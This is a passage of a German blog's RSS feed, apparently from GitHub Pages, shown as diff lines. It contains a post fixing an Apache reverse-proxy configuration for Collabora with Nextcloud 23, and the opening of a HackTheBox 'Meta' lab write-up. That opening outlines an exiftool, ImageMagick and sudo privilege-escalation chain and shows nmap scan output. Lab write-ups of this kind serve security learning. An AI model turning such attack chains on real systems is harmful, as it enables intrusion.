+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://obsidian.md&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;Obsidian Homepage&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+
+    </description>
+    </item>
+    
+    <item>
+    <title>Nextcloud 23 (Docker &#43; Apache 2): Collabora nach Update wieder lauffähig bekommen</title>
+    <link>https://xenophil90.github.io/posts/2022/nextcloud-23-collabora-nach-update-wieder-lauffaehig-bekommen/</link>
+    <pubDate>Tue, 25 Jan 2022 15:18:17 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2022/nextcloud-23-collabora-nach-update-wieder-lauffaehig-bekommen/</guid>
+    <description>
+        &lt;h2 id=&#34;einleitung&#34;&gt;
+    &lt;a href=&#34;#einleitung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Einleitung
+&lt;/h2&gt;
+&lt;p&gt;Mit dem Update auf die derzeit aktuelle Nextcloud-Version 23 wurde Collabora Office als bevorzugte Office-Lösung der Cloud eingeführt&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/nextcloud-logo.svg&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;fehlerbeschreibung&#34;&gt;
+    &lt;a href=&#34;#fehlerbeschreibung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Fehlerbeschreibung
+&lt;/h2&gt;
+&lt;p&gt;Ich nutze Nextcloud in einem Docker-Setup. Collabora wird in einem eigenen Docker-Container betrieben. Auf dem Host-System läuft &lt;em&gt;Apache 2&lt;/em&gt; als Reverse Proxy, der die Verbindungen an die einzelnen Docker-Container weiterleitet.&lt;/p&gt;
+&lt;p&gt;Mit dem Update auf die neuste Collabora-Version zusammen mit Nextcloud 23 konnte der Collabora-Server nicht mehr gefunden werden. Somit war eine Bearbeitung von Dokumenten in der Nextcloud nicht mehr möglich. &lt;strong&gt;Stattdessen vermeldete Collabora, dass Dokumente nicht geöffnet werden könnten.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;die-lösung&#34;&gt;
+    &lt;a href=&#34;#die-l%c3%b6sung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Die Lösung
+&lt;/h2&gt;
+&lt;p&gt;Es stellte sich nach kurzer Recherche heraus, dass sich mit dem Update von Collabora einige Ordnerpfade geändert haben&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;. Meine Apache 2-Konfiguration hatte noch die alten Ordner-Pfade enthalten.&lt;/p&gt;
+&lt;p&gt;Die korrigierte Fassung der Konfigurationsdatei unter &lt;code&gt;/etc/apache2/sites-enabled/011-collabora.conf&lt;/code&gt; sieht wie folgt aus:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ServerName office.domain.de
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ErrorLog ${APACHE_LOG_DIR}/error.log
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  AllowEncodedSlashes NoDecode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyEngine On
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyVerify None
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyCheckPeerCN Off
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyCheckPeerName Off
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPreserveHost On
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # static html, js, images, etc. served from coolwsd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # browser is the client part of Collabora Online
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /browser https://127.0.0.1:9980/browser retry=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /browser https://127.0.0.1:9980/browser
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # WOPI discovery URL
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /hosting/discovery https://127.0.0.1:9980/hosting/discovery retry=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /hosting/discovery https://127.0.0.1:9980/hosting/discovery
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Capabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities retry=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Main websocket
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassMatch      &amp;#34;/cool/(.*)/ws$&amp;#34;      wss://127.0.0.1:9980/cool/$1/ws nocanon
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Admin Console websocket
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /cool/adminws wss://127.0.0.1:9980/cool/adminws
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Download as, Fullscreen presentation and Image upload operations
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /cool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /cool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Compatibility with integrations that use the /lool/convert-to endpoint
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /lool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /lool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  RewriteEngine on
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  RewriteCond %{SERVER_NAME} =office.domain.de
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/VirtualHost&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;VirtualHost *:443&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ServerName office.domain.de
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ErrorLog ${APACHE_LOG_DIR}/error.log
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLEngine on
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  AllowEncodedSlashes NoDecode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyEngine On
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyVerify None
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyCheckPeerCN Off
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLProxyCheckPeerName Off
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPreserveHost On
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # static html, js, images, etc. served from coolwsd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # browser is the client part of Collabora Online
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /browser https://127.0.0.1:9980/browser retry=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /browser https://127.0.0.1:9980/browser
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # WOPI discovery URL
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /hosting/discovery https://127.0.0.1:9980/hosting/discovery retry=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /hosting/discovery https://127.0.0.1:9980/hosting/discovery
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Capabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities retry=0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Main websocket
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassMatch      &amp;#34;/cool/(.*)/ws$&amp;#34;      wss://127.0.0.1:9980/cool/$1/ws nocanon
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Admin Console websocket
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /cool/adminws wss://127.0.0.1:9980/cool/adminws
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Download as, Fullscreen presentation and Image upload operations
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /cool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /cool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  # Compatibility with integrations that use the /lool/convert-to endpoint
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPass           /lool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ProxyPassReverse    /lool https://127.0.0.1:9980/cool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Include      /etc/letsencrypt/options-ssl-apache.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLCertificateFile /etc/letsencrypt/live/cloud.domain.de/fullchain.pem
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  SSLCertificateKeyFile /etc/letsencrypt/live/cloud.domain.de/privkey.pem
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/VirtualHost&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Diese Problemlösung habe ich ebenfalls in das Nextcloud-Forum gepostet&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;. Dort gibt es eine exzellente Anleitung über die Einrichtung von Nextcloud in Docker.&lt;/p&gt;
+&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://nextcloud.com/de/press/pr20211130-1/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;Nextcloud Hub II brings major overhaul, introducing Nextcloud Office, P2P backup, more&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://sdk.collaboraonline.com/docs/installation/Proxy_settings.html&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;Collabora Documentation: Proxy settings&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:3&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://help.nextcloud.com/t/howto-ubuntu-docker-nextcloud-talk-collabora/76430/87&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt;HowTo: Ubuntu + Docker + Nextcloud + Talk + Collabora&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:3&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;
+
+    </description>
+    </item>
+    
+    <item>
+    <title>HackTheBox: Meta</title>
+    <link>https://xenophil90.github.io/posts/2022/htb-meta/</link>
+    <pubDate>Mon, 24 Jan 2022 15:09:03 +0100</pubDate>
+    <author>Phil Krämer</author>
+    <guid>https://xenophil90.github.io/posts/2022/htb-meta/</guid>
+    <description>
+        &lt;h2 id=&#34;einleitung&#34;&gt;
+    &lt;a href=&#34;#einleitung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Einleitung
+&lt;/h2&gt;
+&lt;p&gt;Meta ist eine als &lt;em&gt;Medium&lt;/em&gt; eingestufte Maschine auf HackTheBox. Sie wurde Ende Januar 2022 veröffentlicht. Um die Maschine zu hacken ist es notwendig eine Schwachstelle in &lt;em&gt;exiftool&lt;/em&gt; auszunutzen. Anschließend muss eine Schwachstelle des Moduls &lt;em&gt;Mogrify&lt;/em&gt; aus der ImageMagick-Werkzeugsammlung ausgenutzt werden, um nach der ersten Shell den nächsten Benutzeraccount zu übernehmen. Als letzter Schritt wird eine Schwachstelle der Konfiguration von &lt;em&gt;sudo&lt;/em&gt; und &lt;em&gt;neofetech&lt;/em&gt; ausgenutzt, um Root-Zugang zu erhalten.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Dieser Artikel beschreibt die Lösung der Maschine und damit gilt: Spoileralarm!&lt;/strong&gt;&lt;/p&gt;
+&lt;figure&gt;&lt;img src=&#34;https://xenophil90.github.io/img/htb-meta-1.png&#34;&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&#34;initiale-erkundung&#34;&gt;
+    &lt;a href=&#34;#initiale-erkundung&#34; class=&#34;anchor&#34;&gt;
+        &lt;svg class=&#34;icon&#34; aria-hidden=&#34;true&#34; focusable=&#34;false&#34; height=&#34;16&#34; version=&#34;1.1&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34;&gt;
+            &lt;path fill-rule=&#34;evenodd&#34;
+                d=&#34;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&#34;&gt;
+            &lt;/path&gt;
+        &lt;/svg&gt;
+    &lt;/a&gt;
+    Initiale Erkundung
+&lt;/h2&gt;
+&lt;p&gt;Zunächst wird das System mithilfe von &lt;code&gt;nmap&lt;/code&gt; gescannt. Um den Prozess zu vereinfachen, nutze ich dafür mein Skript mit dem Namen &lt;code&gt;fast-nmap&lt;/code&gt;&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.92 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-01-23 14:57 CET
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.140.80
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.026s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
